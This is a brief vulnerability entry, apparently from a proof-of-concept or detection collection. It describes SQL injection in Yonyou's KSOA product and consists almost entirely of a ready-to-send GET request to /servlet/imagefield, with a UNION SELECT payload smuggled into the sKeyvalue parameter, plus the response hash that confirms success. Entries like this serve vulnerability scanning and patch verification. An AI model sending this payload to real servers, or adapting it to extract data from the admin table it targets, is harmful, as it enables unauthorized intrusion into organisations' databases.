# 用友时空KSOASQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1`
- **响应特征**：200 098f6bcd4621d373cade4e832627b4f6